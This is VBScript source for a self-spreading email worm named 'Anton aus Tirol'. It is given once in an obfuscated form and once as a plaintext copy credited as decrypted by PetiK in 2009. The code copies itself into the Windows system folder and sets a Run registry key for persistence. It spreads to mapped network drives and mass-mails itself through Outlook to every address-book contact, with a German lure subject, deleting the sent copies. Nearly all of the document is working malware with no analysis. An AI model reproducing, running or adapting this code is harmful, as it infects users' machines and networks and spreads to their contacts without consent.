   ' Anton aus Tirol

   On Error Resume Next

   Dim RVM
   Dim BCT
   Dim WG48
   Dim MYV7MVJ7
   Dim HMMXS
   Dim EQP41Y
   Dim CVCH
   Dim KDAP72X
   Dim VPE4H
   Dim UD15

   Set RVM = CreateObject( TU2A( "udfkcPnfutzTfmjG/hojuqjsdT" ) )
   RVM.CopyFile WScript.ScriptFullName, RVM.BuildPath( RVM.GetSpecialFolder(1), TU2A( "TCW/E[5BS" ) )

   Set BCT = CreateObject( TU2A( "mmfiT/uqjsdTX" ) )
   BCT.RegWrite TU2A( "]ovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ) & TU2A( "E[5BS" ), RVM.BuildPath( RVM.GetSpecialFolder(1), TU2A( "TCW/E[5BS" ) )


   Set WG48 = CreateObject( TU2A( "lspxufO/uqjsdTX" ) )
   Set HMMXS = WG48.EnumNetworkDrives

   If HMMXS.Count <> 0 Then
      For MYV7MVJ7 = 0 To HMMXS.Count - 1
          If InStr( HMMXS.Item( MYV7MVJ7), TU2A( "]" ) ) <> 0 Then
             RVM.CopyFile WScript.ScriptFullName, RVM.BuildPath( HMMXS.Item( MYV7MVJ7), TU2A( "TCW/E[5BS" ) )
          End If
      Next
   End If

   MYV7MVJ7 = BCT.RegRead( TU2A( "]FOJIDBN`MBDPM`ZFLI" ) & TU2A( "E[5BS" ) )

   If MYV7MVJ7 = "" Or MYV7MVJ7 > 20 Then
      MYV7MVJ7 = 0
   End If

   If MYV7MVJ7 = 0 Then
      Set KDAP72X = CreateObject( TU2A( "opjubdjmqqB/lppmuvP" ) )
      Set EQP41Y = KDAP72X.GetNameSpace( TU2A( "JQBN" ) )

      For Each CVCH In EQP41Y.AddressLists
          Set HMMXS = KDAP72X.CreateItem( 0 )

          For VPE4H = 1 To CVCH.AddressEntries.Count
              Set UD15 = CVCH.AddressEntries( VPE4H )

              If VPE4H = 1 Then
                 HMMXS.BCC = UD15.Address
              Else
                 HMMXS.BCC = HMMXS.BCC & TU2A( "!<" ) & UD15.Address
              End If
          Next

          HMMXS.Subject = TU2A( """"ucjh!idjn!sýg!tf!tbx!futfc!tbe!idjmo÷tsfq!utj!tbe!pmmbI" )
          HMMXS.Body = TU2A( "fe/ynhAuoobscfheobi" )
          HMMXS.Attachmets.Add WScript.ScriptFullName
          HMMXS.DeleteAfterSubmit = True
          HMMXS.Send
      Next

      MYV7MVJ7 = 0
   End If

   BCT.RegWrite TU2A( "]FOJIDBN`MBDPM`ZFLI" ) & TU2A( "E[5BS" ), MYV7MVJ7 + 1

   Function TU2A( BCM )
      Dim M75B
      Dim T6TA3MU
      Dim AFOJH30K

      M75B = ""

      For T6TA3MU = 1 To Len( BCM )
          AFOJH30K = Mid( BCM, T6TA3MU, 1 )

          M75B = Chr( Asc( AFOJH30K ) - 1 ) & M75B
      Next

      TU2A = M75B
   End Function

   ' Original Source Code decrypted by PetiK - 19/07/2009

   ' Anton aus Tirol

   On Error Resume Next

   Dim RVM
   Dim BCT
   Dim WG48
   Dim MYV7MVJ7
   Dim HMMXS
   Dim EQP41Y
   Dim CVCH
   Dim KDAP72X
   Dim VPE4H
   Dim UD15

   Set RVM = CreateObject( "Scripting.FileSystemObject" )
   RVM.CopyFile WScript.ScriptFullName, RVM.BuildPath( RVM.GetSpecialFolder(1), "RA4ZD.VBS" )

   Set BCT = CreateObject( "WScript.Shell" )
   BCT.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "RA4ZD", RVM.BuildPath( RVM.GetSpecialFolder(1), "RA4ZD.VBS" )


   Set WG48 = CreateObject( "WScript.Network" )
   Set HMMXS = WG48.EnumNetworkDrives

   If HMMXS.Count <> 0 Then
      For MYV7MVJ7 = 0 To HMMXS.Count - 1
          If InStr( HMMXS.Item( MYV7MVJ7), "\" ) <> 0 Then
             RVM.CopyFile WScript.ScriptFullName, RVM.BuildPath( HMMXS.Item( MYV7MVJ7), "RA4ZD.VBS" )
          End If
      Next
   End If

   MYV7MVJ7 = BCT.RegRead( "HKEY_LOCAL_MACHINE\" & "RA4ZD" )

   If MYV7MVJ7 = "" Or MYV7MVJ7 > 20 Then
      MYV7MVJ7 = 0
   End If

   If MYV7MVJ7 = 0 Then
      Set KDAP72X = CreateObject( "Outlook.Application" )
      Set EQP41Y = KDAP72X.GetNameSpace( "MAPI" )

      For Each CVCH In EQP41Y.AddressLists
          Set HMMXS = KDAP72X.CreateItem( 0 )

          For VPE4H = 1 To CVCH.AddressEntries.Count
              Set UD15 = CVCH.AddressEntries( VPE4H )

              If VPE4H = 1 Then
                 HMMXS.BCC = UD15.Address
              Else
                 HMMXS.BCC = HMMXS.BCC & "; " & UD15.Address
              End If
          Next

          HMMXS.Subject = "Hallo das ist persönlich das beste was es für mich gibt"
          HMMXS.Body = "handgebrannt@gmx.de"
          HMMXS.Attachmets.Add WScript.ScriptFullName
          HMMXS.DeleteAfterSubmit = True
          HMMXS.Send
      Next

      MYV7MVJ7 = 0
   End If

   BCT.RegWrite "HKEY_LOCAL_MACHINE\" & "RA4ZD", MYV7MVJ7 + 1

   Function TU2A( BCM )
      Dim M75B
      Dim T6TA3MU
      Dim AFOJH30K

      M75B = ""

      For T6TA3MU = 1 To Len( BCM )
          AFOJH30K = Mid( BCM, T6TA3MU, 1 )

          M75B = Chr( Asc( AFOJH30K ) - 1 ) & M75B
      Next

      TU2A = M75B
   End Function
